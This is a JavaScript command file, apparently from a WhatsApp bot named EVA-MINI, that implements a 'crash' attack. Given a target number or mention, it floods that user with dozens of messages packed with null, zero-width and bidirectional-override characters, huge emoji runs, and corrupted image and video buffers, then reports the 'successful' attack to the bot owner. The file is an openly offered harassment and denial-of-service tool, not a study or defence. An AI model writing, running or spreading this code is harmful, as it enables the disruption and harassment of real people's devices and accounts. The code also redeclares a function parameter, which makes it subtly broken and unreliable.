// commands/crash.js - Crash Attack for EVA-MINI
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '💥',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // GET TARGET
        // ============================================
        let target;
        const q = args.join(' ');
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;

        if (q && q.match(/\d/)) {
            const cleanNumber = q.replace(/\D/g, '');
            target = jidNormalizedUser(cleanNumber + '@s.whatsapp.net');
        } else if (mentioned) {
            target = mentioned;
        } else if (quoted) {
            target = quoted;
        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .crash [@mention] or reply to user\n\n📌 *Example:* .crash @94703945265\n\n💥 *Send crash payload to target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const targetNumber = target.split('@')[0];
        const statusMsg = await sock.sendMessage(from, {
            text: `💥 *Sending crash payload to @${targetNumber}...*\n\n⏳ Please wait...`,
            mentions: [target]
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // CRASH PAYLOADS
        // ============================================
        let successCount = 0;
        let totalMessages = 20;

        // Different crash payloads
        const payloads = [
            // Payload 1: Repeated crash text
            () => '💀☠️💀☠️💀☠️ CRASH PAYLOAD 💀☠️💀☠️💀☠️\n'.repeat(100),
            
            // Payload 2: Null characters
            () => '\u0000'.repeat(5000),
            
            // Payload 3: Combining characters
            () => '\u034F'.repeat(10000),
            
            // Payload 4: RTL + LTR mix
            () => '\u200E'.repeat(5000) + '\u200F'.repeat(5000),
            
            // Payload 5: Invisible characters
            () => '\u200B'.repeat(10000) + '\u200C'.repeat(10000) + '\u200D'.repeat(10000),
            
            // Payload 6: Emoji flood
            () => '💀'.repeat(5000) + '☠️'.repeat(5000) + '👻'.repeat(5000) + '🔥'.repeat(5000),
            
            // Payload 7: RTL override
            () => '\u202A'.repeat(3000) + '\u202B'.repeat(3000) + '\u202C'.repeat(3000) + '\u202D'.repeat(3000) + '\u202E'.repeat(3000),
            
            // Payload 8: Combining emoji with invisible
            () => '😀'.repeat(1000) + '\u200B'.repeat(5000) + '😁'.repeat(1000) + '\u200C'.repeat(5000) + '😂'.repeat(1000),
            
            // Payload 9: Long text with special chars
            () => '⚠️'.repeat(1000) + '\u00A0'.repeat(5000) + '❗'.repeat(1000) + '\u200B'.repeat(5000),
            
            // Payload 10: Infinite loop simulation
            () => '🔄'.repeat(5000) + '⚡'.repeat(5000) + '🔁'.repeat(5000)
        ];

        for (let i = 0; i < totalMessages; i++) {
            try {
                const payload = payloads[i % payloads.length]();
                await sock.sendMessage(target, { text: payload });
                successCount++;
                
                // Small delay between messages
                await new Promise(resolve => setTimeout(resolve, 200));
            } catch (e) {
                console.log(`Crash payload ${i + 1} failed:`, e.message);
            }
        }

        // ============================================
        // SEND EXTRA CRASH PAYLOADS
        // ============================================
        try {
            // Send multiple long messages rapidly
            for (let i = 0; i < 10; i++) {
                const longText = '💀'.repeat(10000) + '\u200B'.repeat(10000) + '☠️'.repeat(10000) + '\nCRASH #' + (i + 1);
                await sock.sendMessage(target, { text: longText });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {
            console.log('Extra crash payloads failed:', e.message);
        }

        // ============================================
        // SEND CRASH MEDIA (if possible)
        // ============================================
        try {
            // Try to send a corrupted image
            const corruptBuffer = Buffer.from([
                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
                0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00
            ]);
            
            await sock.sendMessage(target, {
                image: corruptBuffer,
                caption: '💥 CRASH IMAGE'
            });
            successCount++;
        } catch (e) {
            console.log('Corrupted image failed:', e.message);
        }

        try {
            // Try to send a corrupted video
            const corruptVideo = Buffer.from([
                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
                0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00
            ]);
            
            await sock.sendMessage(target, {
                video: corruptVideo,
                caption: '💥 CRASH VIDEO'
            });
            successCount++;
        } catch (e) {
            console.log('Corrupted video failed:', e.message);
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `💥 *Crash payload delivered!*\n\n📱 *Target:* @${targetNumber}\n📊 *Payloads:* ${successCount} sent\n💥 *Status:* SUCCESS\n\n⚠️ *Target's WhatsApp may crash or experience issues!*`,
            mentions: [target]
        });

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            await sock.sendMessage(botNumber, {
                text: `💥 *Crash Attack Report*\n\n📱 *Target:* @${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Payloads:* ${successCount}\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`,
                mentions: [target]
            });
        } catch (e) {}

    } catch (error) {
        console.error('Crash command error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};